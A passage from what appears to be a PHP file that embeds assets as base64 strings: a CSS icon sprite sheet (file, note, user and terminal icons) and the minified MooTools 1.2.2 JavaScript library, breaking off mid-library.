IC00OHB4Owp9Ci5pY29uLmZpbGVfemlwX2FkZHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC02NHB4IC00OHB4Owp9Ci5pY29uLmZpbGVfemlwX2dvewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMHB4IC02NHB4Owp9Ci5pY29uLmxvZ291dHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC0xNnB4IC02NHB4Owp9Ci5pY29uLm5vdGV7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMzJweCAtNjRweDsKfQouaWNvbi5ub3RlX2FkZHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC00OHB4IC02NHB4Owp9Ci5pY29uLm5vdGVfZGVsZXRlewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTY0cHggLTY0cHg7Cn0KLmljb24uc2F2ZXsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IDBweCAtODBweDsKfQouaWNvbi50ZXJtaW5hbHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC0xNnB4IC04MHB4Owp9Ci5pY29uLnVzZXJ7CiAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMzJweCAtODBweDsKfQouaWNvbi51c2VyX2FkZHsKICAgIGJhY2tncm91bmQtcG9zaXRpb246IC00OHB4IC04MHB4Owp9Ci5pY29uLnVzZXJfb25saW5lewogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogLTY0cHggLTgwcHg7Cn0K',
  'mootools.js' => 'Ly9Nb29Ub29scywgPGh0dHA6Ly9tb290b29scy5uZXQ+LCBNeSBPYmplY3QgT3JpZW50ZWQgKEphdmFTY3JpcHQpIFRvb2xzLiBDb3B5cmlnaHQgKGMpIDIwMDYtMjAwOSBWYWxlcmlvIFByb2lldHRpLCA8aHR0cDovL21hZDRtaWxrLm5ldD4sIE1JVCBTdHlsZSBMaWNlbnNlLgoKdmFyIE1vb1Rvb2xzPXt2ZXJzaW9uOiIxLjIuMiIsYnVpbGQ6ImYwNDkxZDYyZmJiN2U5MDY3ODlhYTM3MzNkNmE2N2Q0M2U1YWY3YzkifTt2YXIgTmF0aXZlPWZ1bmN0aW9uKGspe2s9a3x8e307dmFyIGE9ay5uYW1lO3ZhciBpPWsubGVnYWN5O3ZhciBiPWsucHJvdGVjdDsKdmFyIGM9ay5pbXBsZW1lbnQ7dmFyIGg9ay5nZW5lcmljczt2YXIgZj1rLmluaXRpYWxpemU7dmFyIGc9ay5hZnRlckltcGxlbWVudHx8ZnVuY3Rpb24oKXt9O3ZhciBkPWZ8fGk7aD1oIT09ZmFsc2U7ZC5jb25zdHJ1Y3Rvcj1OYXRpdmU7ZC4kZmFtaWx5PXtuYW1lOiJuYXRpdmUifTsKaWYoaSYmZil7ZC5wcm90b3R5cGU9aS5wcm90b3R5cGU7fWQucHJvdG90eXBlLmNvbnN0cnVjdG9yPWQ7aWYoYSl7dmFyIGU9YS50b0xvd2VyQ2FzZSgpO2QucHJvdG90eXBlLiRmYW1pbHk9e25hbWU6ZX07TmF0aXZlLnR5cGl6ZShkLGUpO312YXIgaj1mdW5jdGlvbihuLGwsbyxtKXtpZighYnx8bXx8IW4ucHJvdG90eXBlW2xdKXtuLnByb3RvdHlwZVtsXT1vOwp9aWYoaCl7TmF0aXZlLmdlbmVyaWNpemUobixsLGIpO31nLmNhbGwobixsLG8pO3JldHVybiBuO307ZC5hbGlhcz1mdW5jdGlvbihuLGwsbyl7aWYodHlwZW9mIG49PSJzdHJpbmciKXtpZigobj10aGlzLnByb3RvdHlwZVtuXSkpe3JldHVybiBqKHRoaXMsbCxuLG8pOwp9fWZvcih2YXIgbSBpbiBuKXt0aGlzLmFsaWFzKG0sblttXSxsKTt9cmV0dXJuIHRoaXM7fTtkLmltcGxlbWVudD1mdW5jdGlvbihtLGwsbyl7aWYodHlwZW9mIG09PSJzdHJpbmciKXtyZXR1cm4gaih0aGlzLG0sbCxvKTt9Zm9yKHZhciBuIGluIG0pe2oodGhpcyxuLG1bbl0sbCk7Cn1yZXR1cm4gdGhpczt9O2lmKGMpe2QuaW1wbGVtZW50KGMpO31yZXR1cm4gZDt9O05hdGl2ZS5nZW5lcmljaXplPWZ1bmN0aW9uKGIsYyxhKXtpZigoIWF8fCFiW2NdKSYmdHlwZW9mIGIucHJvdG90eXBlW2NdPT0iZnVuY3Rpb24iKXtiW2NdPWZ1bmN0aW9uKCl7dmFyIGQ9QXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzKTsKcmV0dXJuIGIucHJvdG90eXBlW2NdLmFwcGx5KGQuc2hpZnQoKSxkKTt9O319O05hdGl2ZS5pbXBsZW1lbnQ9ZnVuY3Rpb24oZCxjKXtmb3IodmFyIGI9MCxhPWQubGVuZ3RoO2I8YTtiKyspe2RbYl0uaW1wbGVtZW50KGMpO319O05hdGl2ZS50eXBpemU9ZnVuY3Rpb24oYSxiKXtpZighYS50eXBlKXthLnR5cGU9ZnVuY3Rpb24oYyl7cmV0dXJuKCR0eXBlKGMpPT09Yik7Cn07fX07KGZ1bmN0aW9uKCl7dmFyIGE9e0FycmF5OkFycmF5LERhdGU6RGF0ZSxGdW5jdGlvbjpGdW5jdGlvbixOdW1iZXI6TnVtYmVyLFJlZ0V4cDpSZWdFeHAsU3RyaW5nOlN0cmluZ307Zm9yKHZhciBoIGluIGEpe25ldyBOYXRpdmUoe25hbWU6aCxpbml0aWFsaXplOmFbaF0scHJvdGVjdDp0cnVlfSk7Cn12YXIgZD17ImJvb2xlYW4iOkJvb2xlYW4sIm5hdGl2ZSI6TmF0aXZlLG9iamVjdDpPYmplY3R9O2Zvcih2YXIgYyBpbiBkKXtOYXRpdmUudHlwaXplKGRbY10sYyk7fXZhciBmPXtBcnJheTpbImNvbmNhdCIsImluZGV4T2YiLCJqb2luIiwibGFzdEluZGV4T2YiLCJwb3AiLCJwdXNoIiwicmV2ZXJzZSIsInNoaWZ0Iiwic2xpY2UiLCJzb3J0Iiwic3BsaWNlIiwidG9TdHJpbmciLCJ1bnNoaWZ0IiwidmFsdWVPZiJdLFN0cmluZzpbImNoYXJBdCIsImNoYXJDb2RlQXQiLCJjb25jYXQiLCJpbmRleE9mIiwibGFzdEluZGV4T2YiLCJtYXRjaCIsInJlcGxhY2UiLCJzZWFyY2giLCJzbGljZSIsInNwbGl0Iiwic3Vic3RyIiwic3Vic3RyaW5nIiwidG9Mb3dlckNhc2UiLCJ0b1VwcGVyQ2FzZSIsInZhbHVlT2YiXX07CmZvcih2YXIgZSBpbiBmKXtmb3IodmFyIGI9ZltlXS5sZW5ndGg7Yi0tOyl7TmF0aXZlLmdlbmVyaWNpemUod2luZG93W2VdLGZbZV1bYl0sdHJ1ZSk7fX19KSgpO3ZhciBIYXNoPW5ldyBOYXRpdmUoe25hbWU6Ikhhc2giLGluaXRpYWxpemU6ZnVuY3Rpb24oYSl7aWYoJHR5cGUoYSk9PSJoYXNoIil7YT0kdW5saW5rKGEuZ2V0Q2xlYW4oKSk7Cn1mb3IodmFyIGIgaW4gYSl7dGhpc1tiXT1hW2JdO31yZXR1cm4gdGhpczt9fSk7SGFzaC5pbXBsZW1lbnQoe2ZvckVhY2g6ZnVuY3Rpb24oYixjKXtmb3IodmFyIGEgaW4gdGhpcyl7aWYodGhpcy5oYXNPd25Qcm9wZXJ0eShhKSl7Yi5jYWxsKGMsdGhpc1thXSxhLHRoaXMpOwp9fX0sZ2V0Q2xlYW46ZnVuY3Rpb24oKXt2YXIgYj17fTtmb3IodmFyIGEgaW4gdGhpcyl7aWYodGhpcy5oYXNPd25Qcm9wZXJ0eShhKSl7YlthXT10aGlzW2FdO319cmV0dXJuIGI7fSxnZXRMZW5ndGg6ZnVuY3Rpb24oKXt2YXIgYj0wO2Zvcih2YXIgYSBpbiB0aGlzKXtpZih0aGlzLmhhc093blByb3BlcnR5KGEpKXtiKys7Cn19cmV0dXJuIGI7fX0pO0hhc2guYWxpYXMoImZvckVhY2giLCJlYWNoIik7QXJyYXkuaW1wbGVtZW50KHtmb3JFYWNoOmZ1bmN0aW9uKGMsZCl7Zm9yKHZhciBiPTAsYT10aGlzLmxlbmd0aDtiPGE7YisrKXtjLmNhbGwoZCx0aGlzW2JdLGIsdGhpcyk7fX19KTtBcnJheS5hbGlhcygiZm9yRWFjaCIsImVhY2giKTsKZnVuY3Rpb24gJEEoYil7aWYoYi5pdGVtKXt2YXIgYT1iLmxlbmd0aCxjPW5ldyBBcnJheShhKTt3aGlsZShhLS0pe2NbYV09YlthXTt9cmV0dXJuIGM7fXJldHVybiBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChiKTt9ZnVuY3Rpb24gJGFyZ3VtZW50cyhhKXtyZXR1cm4gZnVuY3Rpb24oKXtyZXR1cm4gYXJndW1lbnRzW2FdOwp9O31mdW5jdGlvbiAkY2hrKGEpe3JldHVybiAhIShhfHxhPT09MCk7fWZ1bmN0aW9uICRjbGVhcihhKXtjbGVhclRpbWVvdXQoYSk7Y2xlYXJJbnRlcnZhbChhKTtyZXR1cm4gbnVsbDt9ZnVuY3Rpb24gJGRlZmluZWQoYSl7cmV0dXJuKGEhPXVuZGVmaW5lZCk7fWZ1bmN0aW9uICRlYWNoKGMsYixkKXt2YXIgYT0kdHlwZShjKTsKKChhPT0iYXJndW1lbnRzInx8YT09ImNvbGxlY3Rpb24ifHxhPT0iYXJyYXkiKT9BcnJheTpIYXNoKS5lYWNoKGMsYixkKTt9ZnVuY3Rpb24gJGVtcHR5KCl7fWZ1bmN0aW9uICRleHRlbmQoYyxhKXtmb3IodmFyIGIgaW4gKGF8fHt9KSl7Y1tiXT1hW2JdO31yZXR1cm4gYzsKfWZ1bmN0aW9uICRIKGEpe3JldHVybiBuZXcgSGFzaChhKTt9ZnVuY3Rpb24gJGxhbWJkYShhKXtyZXR1cm4odHlwZW9mIGE9PSJmdW5jdGlvbiIpP2E6ZnVuY3Rpb24oKXtyZXR1cm4gYTt9O31mdW5jdGlvbiAkbWVyZ2UoKXt2YXIgYT1BcnJheS5zbGljZShhcmd1bWVudHMpOwphLnVuc2hpZnQoe30pO3JldHVybiAkbWl4aW4uYXBwbHkobnVsbCxhKTt9ZnVuY3Rpb24gJG1peGluKGUpe2Zvcih2YXIgZD0xLGE9YXJndW1lbnRzLmxlbmd0aDtkPGE7ZCsrKXt2YXIgYj1hcmd1bWVudHNbZF07aWYoJHR5cGUoYikhPSJvYmplY3QiKXtjb250aW51ZTsKfWZvcih2YXIgYyBpbiBiKXt2YXIgZz1iW2NdLGY9ZVtjXTtlW2NdPShmJiYkdHlwZShnKT09Im9iamVjdCImJiR0eXBlKGYpPT0ib2JqZWN0Iik/JG1peGluKGYsZyk6JHVubGluayhnKTt9fXJldHVybiBlO31mdW5jdGlvbiAkcGljaygpe2Zvcih2YXIgYj0wLGE9YXJndW1lbnRzLmxlbmd0aDsKYjxhO2IrKyl7aWYoYXJndW1lbnRzW2JdIT11bmRlZmluZWQpe3JldHVybiBhcmd1bWVudHNbYl07fX1yZXR1cm4gbnVsbDt9ZnVuY3Rpb24gJHJhbmRvbShiLGEpe3JldHVybiBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqKGEtYisxKStiKTt9ZnVuY3Rpb24gJHNwbGF0KGIpe3ZhciBhPSR0eXBlKGIpOwpyZXR1cm4oYSk/KChhIT0iYXJyYXkiJiZhIT0iYXJndW1lbnRzIik/W2JdOmIpOltdO312YXIgJHRpbWU9RGF0ZS5ub3d8fGZ1bmN0aW9uKCl7cmV0dXJuICtuZXcgRGF0ZTt9O2Z1bmN0aW9uICR0cnkoKXtmb3IodmFyIGI9MCxhPWFyZ3VtZW50cy5sZW5ndGg7YjxhOwpiKyspe3RyeXtyZXR1cm4gYXJndW1lbnRzW2JdKCk7fWNhdGNoKGMpe319cmV0dXJuIG51bGw7fWZ1bmN0aW9uICR0eXBlKGEpe2lmKGE9PXVuZGVmaW5lZCl7cmV0dXJuIGZhbHNlO31pZihhLiRmYW1pbHkpe3JldHVybihhLiRmYW1pbHkubmFtZT09Im51bWJlciImJiFpc0Zpbml0ZShhKSk/ZmFsc2U6YS4kZmFtaWx5Lm5hbWU7Cn1pZihhLm5vZGVOYW1lKXtzd2l0Y2goYS5ub2RlVHlwZSl7Y2FzZSAxOnJldHVybiJlbGVtZW50IjtjYXNlIDM6cmV0dXJuKC9cUy8pLnRlc3QoYS5ub2RlVmFsdWUpPyJ0ZXh0bm9kZSI6IndoaXRlc3BhY2UiO319ZWxzZXtpZih0eXBlb2YgYS5sZW5ndGg9PSJudW1iZXIiKXtpZihhLmNhbGxlZSl7cmV0dXJuImFyZ3VtZW50cyI7Cn1lbHNle2lmKGEuaXRlbSl7cmV0dXJuImNvbGxlY3Rpb24iO319fX1yZXR1cm4gdHlwZW9mIGE7fWZ1bmN0aW9uICR1bmxpbmsoYyl7dmFyIGI7c3dpdGNoKCR0eXBlKGMpKXtjYXNlIm9iamVjdCI6Yj17fTtmb3IodmFyIGUgaW4gYyl7YltlXT0kdW5saW5rKGNbZV0pOwp9YnJlYWs7Y2FzZSJoYXNoIjpiPW5ldyBIYXNoKGMpO2JyZWFrO2Nhc2UiYXJyYXkiOmI9W107Zm9yKHZhciBkPTAsYT1jLmxlbmd0aDtkPGE7ZCsrKXtiW2RdPSR1bmxpbmsoY1tkXSk7fWJyZWFrO2RlZmF1bHQ6cmV0dXJuIGM7fXJldHVybiBiO312YXIgQnJvd3Nlcj0kbWVyZ2Uoe0VuZ2luZTp7bmFtZToidW5rbm93biIsdmVyc2lvbjowfSxQbGF0Zm9ybTp7bmFtZTood2luZG93Lm9yaWVudGF0aW9uIT11bmRlZmluZWQpPyJpcG9kIjoobmF2aWdhdG9yLnBsYXRmb3JtLm1hdGNoKC9tYWN8d2lufGxpbnV4L2kpfHxbIm90aGVyIl0pWzBdLnRvTG93ZXJDYXNlKCl9LEZlYXR1cmVzOnt4cGF0aDohIShkb2N1bWVudC5ldmFsdWF0ZSksYWlyOiEhKHdpbmRvdy5ydW50aW1lKSxxdWVyeTohIShkb2N1bWVudC5xdWVyeVNlbGVjdG9yKX0sUGx1Z2luczp7fSxFbmdpbmVzOntwcmVzdG86ZnVuY3Rpb24oKXtyZXR1cm4oIXdpbmRvdy5vcGVyYSk/ZmFsc2U6KChhcmd1bWVudHMuY2FsbGVlLmNhbGxlcik/OTYwOigoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSk/OTUwOjkyNSkpOwp9LHRyaWRlbnQ6ZnVuY3Rpb24oKXtyZXR1cm4oIXdpbmRvdy5BY3RpdmVYT2JqZWN0KT9mYWxzZTooKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCk/NTo0KTt9LHdlYmtpdDpmdW5jdGlvbigpe3JldHVybihuYXZpZ2F0b3IudGFpbnRFbmFibGVkKT9mYWxzZTooKEJyb3dzZXIuRmVhdHVyZXMueHBhdGgpPygoQnJvd3Nlci5GZWF0dXJlcy5xdWVyeSk/NTI1OjQyMCk6NDE5KTsKfSxnZWNrbzpmdW5jdGlvbigpe3JldHVybihkb2N1bWVudC5nZXRCb3hPYmplY3RGb3I9PXVuZGVmaW5lZCk/ZmFsc2U6KChkb2N1bWVudC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKT8xOToxOCk7fX19LEJyb3dzZXJ8fHt9KTtCcm93c2VyLlBsYXRmb3JtW0Jyb3dzZXIuUGxhdGZvcm0ubmFtZV09dHJ1ZTsKQnJvd3Nlci5kZXRlY3Q9ZnVuY3Rpb24oKXtmb3IodmFyIGIgaW4gdGhpcy5FbmdpbmVzKXt2YXIgYT10aGlzLkVuZ2luZXNbYl0oKTtpZihhKXt0aGlzLkVuZ2luZT17bmFtZTpiLHZlcnNpb246YX07dGhpcy5FbmdpbmVbYl09dGhpcy5FbmdpbmVbYithXT10cnVlOwpicmVhazt9fXJldHVybntuYW1lOmIsdmVyc2lvbjphfTt9O0Jyb3dzZXIuZGV0ZWN0KCk7QnJvd3Nlci5SZXF1ZXN0PWZ1bmN0aW9uKCl7cmV0dXJuICR0cnkoZnVuY3Rpb24oKXtyZXR1cm4gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7fSxmdW5jdGlvbigpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdCgiTVNYTUwyLlhNTEhUVFAiKTsKfSk7fTtCcm93c2VyLkZlYXR1cmVzLnhocj0hIShCcm93c2VyLlJlcXVlc3QoKSk7QnJvd3Nlci5QbHVnaW5zLkZsYXNoPShmdW5jdGlvbigpe3ZhciBhPSgkdHJ5KGZ1bmN0aW9uKCl7cmV0dXJuIG5hdmlnYXRvci5wbHVnaW5zWyJTaG9ja3dhdmUgRmxhc2giXS5kZXNjcmlwdGlvbjsKfSxmdW5jdGlvbigpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdCgiU2hvY2t3YXZlRmxhc2guU2hvY2t3YXZlRmxhc2giKS5HZXRWYXJpYWJsZSgiJHZlcnNpb24iKTt9KXx8IjAgcjAiKS5tYXRjaCgvXGQrL2cpO3JldHVybnt2ZXJzaW9uOnBhcnNlSW50KGFbMF18fDArIi4iK2FbMV0sMTApfHwwLGJ1aWxkOnBhcnNlSW50KGFbMl0sMTApfHwwfTsKfSkoKTtmdW5jdGlvbiAkZXhlYyhiKXtpZighYil7cmV0dXJuIGI7fWlmKHdpbmRvdy5leGVjU2NyaXB0KXt3aW5kb3cuZXhlY1NjcmlwdChiKTt9ZWxzZXt2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNldEF0dHJpYnV0ZSgidHlwZSIsInRleHQvamF2YXNjcmlwdCIpOwphWyhCcm93c2VyLkVuZ2luZS53ZWJraXQmJkJyb3dzZXIuRW5naW5lLnZlcnNpb248NDIwKT8iaW5uZXJUZXh0IjoidGV4dCJdPWI7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChhKTtkb2N1bWVudC5oZWFkLnJlbW92ZUNoaWxkKGEpO31yZXR1cm4gYjt9TmF0aXZlLlVJRD0xOwp2YXIgJHVpZD0oQnJvd3Nlci5FbmdpbmUudHJpZGVudCk/ZnVuY3Rpb24oYSl7cmV0dXJuKGEudWlkfHwoYS51aWQ9W05hdGl2ZS5VSUQrK10pKVswXTt9OmZ1bmN0aW9uKGEpe3JldHVybiBhLnVpZHx8KGEudWlkPU5hdGl2ZS5VSUQrKyk7fTt2YXIgV2luZG93PW5ldyBOYXRpdmUoe25hbWU6IldpbmRvdyIsbGVnYWN5OihCcm93c2VyLkVuZ2luZS50cmlkZW50KT9udWxsOndpbmRvdy5XaW5kb3csaW5pdGlhbGl6ZTpmdW5jdGlvbihhKXskdWlkKGEpOwppZighYS5FbGVtZW50KXthLkVsZW1lbnQ9JGVtcHR5O2lmKEJyb3dzZXIuRW5naW5lLndlYmtpdCl7YS5kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTt9YS5FbGVtZW50LnByb3RvdHlwZT0oQnJvd3Nlci5FbmdpbmUud2Via2l0KT93aW5kb3dbIltbRE9NRWxlbWVudC5wcm90b3R5cGVdXSJdOnt9Owp9YS5kb2N1bWVudC53aW5kb3c9YTtyZXR1cm4gJGV4dGVuZChhLFdpbmRvdy5Qcm90b3R5cGUpO30sYWZ0ZXJJbXBsZW1lbnQ6ZnVuY3Rpb24oYixhKXt3aW5kb3dbYl09V2luZG93LlByb3RvdHlwZVtiXT1hO319KTtXaW5kb3cuUHJvdG90eXBlPXskZmFtaWx5OntuYW1lOiJ3aW5kb3cifX07Cm5ldyBXaW5kb3cod2luZG93KTt2YXIgRG9jdW1lbnQ9bmV3IE5hdGl2ZSh7bmFtZToiRG9jdW1lbnQiLGxlZ2FjeTooQnJvd3Nlci5FbmdpbmUudHJpZGVudCk/bnVsbDp3aW5kb3cuRG9jdW1lbnQsaW5pdGlhbGl6ZTpmdW5jdGlvbihhKXskdWlkKGEpO2EuaGVhZD1hLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF07CmEuaHRtbD1hLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF07aWYoQnJvd3Nlci5FbmdpbmUudHJpZGVudCYmQnJvd3Nlci5FbmdpbmUudmVyc2lvbjw9NCl7JHRyeShmdW5jdGlvbigpe2EuZXhlY0NvbW1hbmQoIkJhY2tncm91bmRJbWFnZUNhY2hlIixmYWxzZSx0cnVlKTsKfSk7fWlmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe2Eud2luZG93LmF0dGFjaEV2ZW50KCJvbnVubG9hZCIsZnVuY3Rpb24oKXthLndpbmRvdy5kZXRhY2hFdmVudCgib251bmxvYWQiLGFyZ3VtZW50cy5jYWxsZWUpO2EuaGVhZD1hLmh0bWw9YS53aW5kb3c9bnVsbDsKfSk7fXJldHVybiAkZXh0ZW5kKGEsRG9jdW1lbnQuUHJvdG90eXBlKTt9LGFmdGVySW1wbGVtZW50OmZ1bmN0aW9uKGIsYSl7ZG9jdW1lbnRbYl09RG9jdW1lbnQuUHJvdG90eXBlW2JdPWE7fX0pO0RvY3VtZW50LlByb3RvdHlwZT17JGZhbWlseTp7bmFtZToiZG9jdW1lbnQifX07Cm5ldyBEb2N1bWVudChkb2N1bWVudCk7QXJyYXkuaW1wbGVtZW50KHtldmVyeTpmdW5jdGlvbihjLGQpe2Zvcih2YXIgYj0wLGE9dGhpcy5sZW5ndGg7YjxhO2IrKyl7aWYoIWMuY2FsbChkLHRoaXNbYl0sYix0aGlzKSl7cmV0dXJuIGZhbHNlO319cmV0dXJuIHRydWU7Cn0sZmlsdGVyOmZ1bmN0aW9uKGQsZSl7dmFyIGM9W107Zm9yKHZhciBiPTAsYT10aGlzLmxlbmd0aDtiPGE7YisrKXtpZihkLmNhbGwoZSx0aGlzW2JdLGIsdGhpcykpe2MucHVzaCh0aGlzW2JdKTt9fXJldHVybiBjO30sY2xlYW46ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5maWx0ZXIoJGRlZmluZWQpOwp9LGluZGV4T2Y6ZnVuY3Rpb24oYyxkKXt2YXIgYT10aGlzLmxlbmd0aDtmb3IodmFyIGI9KGQ8MCk/TWF0aC5tYXgoMCxhK2QpOmR8fDA7YjxhO2IrKyl7aWYodGhpc1tiXT09PWMpe3JldHVybiBiO319cmV0dXJuIC0xO30sbWFwOmZ1bmN0aW9uKGQsZSl7dmFyIGM9W107CmZvcih2YXIgYj0wLGE9dGhpcy5sZW5ndGg7YjxhO2IrKyl7Y1tiXT1kLmNhbGwoZSx0aGlzW2JdLGIsdGhpcyk7fXJldHVybiBjO30sc29tZTpmdW5jdGlvbihjLGQpe2Zvcih2YXIgYj0wLGE9dGhpcy5sZW5ndGg7YjxhO2IrKyl7aWYoYy5jYWxsKGQsdGhpc1tiXSxiLHRoaXMpKXtyZXR1cm4gdHJ1ZTsKfX1yZXR1cm4gZmFsc2U7fSxhc3NvY2lhdGU6ZnVuY3Rpb24oYyl7dmFyIGQ9e30sYj1NYXRoLm1pbih0aGlzLmxlbmd0aCxjLmxlbmd0aCk7Zm9yKHZhciBhPTA7YTxiO2ErKyl7ZFtjW2FdXT10aGlzW2FdO31yZXR1cm4gZDt9LGxpbms6ZnVuY3Rpb24oYyl7dmFyIGE9e307CmZvcih2YXIgZT0wLGI9dGhpcy5sZW5ndGg7ZTxiO2UrKyl7Zm9yKHZhciBkIGluIGMpe2lmKGNbZF0odGhpc1tlXSkpe2FbZF09dGhpc1tlXTtkZWxldGUgY1tkXTticmVhazt9fX1yZXR1cm4gYTt9LGNvbnRhaW5zOmZ1bmN0aW9uKGEsYil7cmV0dXJuIHRoaXMuaW5kZXhPZihhLGIpIT0tMTsKfSxleHRlbmQ6ZnVuY3Rpb24oYyl7Zm9yKHZhciBiPTAsYT1jLmxlbmd0aDtiPGE7YisrKXt0aGlzLnB1c2goY1tiXSk7fXJldHVybiB0aGlzO30sZ2V0TGFzdDpmdW5jdGlvbigpe3JldHVybih0aGlzLmxlbmd0aCk/dGhpc1t0aGlzLmxlbmd0aC0xXTpudWxsO30sZ2V0UmFuZG9tOmZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMubGVuZ3RoKT90aGlzWyRyYW5kb20oMCx0aGlzLmxlbmd0aC0xKV06bnVsbDsKfSxpbmNsdWRlOmZ1bmN0aW9uKGEpe2lmKCF0aGlzLmNvbnRhaW5zKGEpKXt0aGlzLnB1c2goYSk7fXJldHVybiB0aGlzO30sY29tYmluZTpmdW5jdGlvbihjKXtmb3IodmFyIGI9MCxhPWMubGVuZ3RoO2I8YTtiKyspe3RoaXMuaW5jbHVkZShjW2JdKTt9cmV0dXJuIHRoaXM7Cn0sZXJhc2U6ZnVuY3Rpb24oYil7Zm9yKHZhciBhPXRoaXMubGVuZ3RoO2EtLTthKXtpZih0aGlzW2FdPT09Yil7dGhpcy5zcGxpY2UoYSwxKTt9fXJldHVybiB0aGlzO30sZW1wdHk6ZnVuY3Rpb24oKXt0aGlzLmxlbmd0aD0wO3JldHVybiB0aGlzO30sZmxhdHRlbjpmdW5jdGlvbigpe3ZhciBkPVtdOwpmb3IodmFyIGI9MCxhPXRoaXMubGVuZ3RoO2I8YTtiKyspe3ZhciBjPSR0eXBlKHRoaXNbYl0pO2lmKCFjKXtjb250aW51ZTt9ZD1kLmNvbmNhdCgoYz09ImFycmF5Inx8Yz09ImNvbGxlY3Rpb24ifHxjPT0iYXJndW1lbnRzIik/QXJyYXkuZmxhdHRlbih0aGlzW2JdKTp0aGlzW2JdKTsKfXJldHVybiBkO30saGV4VG9SZ2I6ZnVuY3Rpb24oYil7aWYodGhpcy5sZW5ndGghPTMpe3JldHVybiBudWxsO312YXIgYT10aGlzLm1hcChmdW5jdGlvbihjKXtpZihjLmxlbmd0aD09MSl7Yys9Yzt9cmV0dXJuIGMudG9JbnQoMTYpO30pO3JldHVybihiKT9hOiJyZ2IoIithKyIpIjsKfSxyZ2JUb0hleDpmdW5jdGlvbihkKXtpZih0aGlzLmxlbmd0aDwzKXtyZXR1cm4gbnVsbDt9aWYodGhpcy5sZW5ndGg9PTQmJnRoaXNbM109PTAmJiFkKXtyZXR1cm4idHJhbnNwYXJlbnQiO312YXIgYj1bXTtmb3IodmFyIGE9MDthPDM7YSsrKXt2YXIgYz0odGhpc1thXS0wKS50b1N0cmluZygxNik7CmIucHVzaCgoYy5sZW5ndGg9PTEpPyIwIitjOmMpO31yZXR1cm4oZCk/YjoiIyIrYi5qb2luKCIiKTt9fSk7RnVuY3Rpb24uaW1wbGVtZW50KHtleHRlbmQ6ZnVuY3Rpb24oYSl7Zm9yKHZhciBiIGluIGEpe3RoaXNbYl09YVtiXTt9cmV0dXJuIHRoaXM7fSxjcmVhdGU6ZnVuY3Rpb24oYil7dmFyIGE9dGhpczsKYj1ifHx7fTtyZXR1cm4gZnVuY3Rpb24oZCl7dmFyIGM9Yi5hcmd1bWVudHM7Yz0oYyE9dW5kZWZpbmVkKT8kc3BsYXQoYyk6QXJyYXkuc2xpY2UoYXJndW1lbnRzLChiLmV2ZW50KT8xOjApO2lmKGIuZXZlbnQpe2M9W2R8fHdpbmRvdy5ldmVudF0uZXh0ZW5kKGMpOwp9dmFyIGU9ZnVuY3Rpb24oKXtyZXR1cm4gYS5hcHBseShiLmJpbmR8fG51bGwsYyk7fTtpZihiLmRlbGF5KXtyZXR1cm4gc2V0VGltZW91dChlLGIuZGVsYXkpO31pZihiLnBlcmlvZGljYWwpe3JldHVybiBzZXRJbnRlcnZhbChlLGIucGVyaW9kaWNhbCk7fWlmKGIuYXR0ZW1wdCl7cmV0dXJuICR0cnkoZSk7Cn1yZXR1cm4gZSgpO307fSxydW46ZnVuY3Rpb24oYSxiKXtyZXR1cm4gdGhpcy5hcHBseShiLCRzcGxhdChhKSk7fSxwYXNzOmZ1bmN0aW9uKGEsYil7cmV0dXJuIHRoaXMuY3JlYXRlKHtiaW5kOmIsYXJndW1lbnRzOmF9KTt9LGJpbmQ6ZnVuY3Rpb24oYixhKXtyZXR1cm4gdGhpcy5jcmVhdGUoe2JpbmQ6Yixhcmd1bWVudHM6YX0pOwp9LGJpbmRXaXRoRXZlbnQ6ZnVuY3Rpb24oYixhKXtyZXR1cm4gdGhpcy5jcmVhdGUoe2JpbmQ6Yixhcmd1bWVudHM6YSxldmVudDp0cnVlfSk7fSxhdHRlbXB0OmZ1bmN0aW9uKGEsYil7cmV0dXJuIHRoaXMuY3JlYXRlKHtiaW5kOmIsYXJndW1lbnRzOmEsYXR0ZW1wdDp0cnVlfSkoKTsKfSxkZWxheTpmdW5jdGlvbihiLGMsYSl7cmV0dXJuIHRoaXMuY3JlYXRlKHtiaW5kOmMsYXJndW1lbnRzOmEsZGVsYXk6Yn0pKCk7fSxwZXJpb2RpY2FsOmZ1bmN0aW9uKGMsYixhKXtyZXR1cm4gdGhpcy5jcmVhdGUoe2JpbmQ6Yixhcmd1bWVudHM6YSxwZXJpb2RpY2FsOmN9KSgpOwp9fSk7TnVtYmVyLmltcGxlbWVudCh7bGltaXQ6ZnVuY3Rpb24oYixhKXtyZXR1cm4gTWF0aC5taW4oYSxNYXRoLm1heChiLHRoaXMpKTt9LHJvdW5kOmZ1bmN0aW9uKGEpe2E9TWF0aC5wb3coMTAsYXx8MCk7cmV0dXJuIE1hdGgucm91bmQodGhpcyphKS9hO30sdGltZXM6ZnVuY3Rpb24oYixjKXtmb3IodmFyIGE9MDsKYTx0aGlzO2ErKyl7Yi5jYWxsKGMsYSx0aGlzKTt9fSx0b0Zsb2F0OmZ1bmN0aW9uKCl7cmV0dXJuIHBhcnNlRmxvYXQodGhpcyk7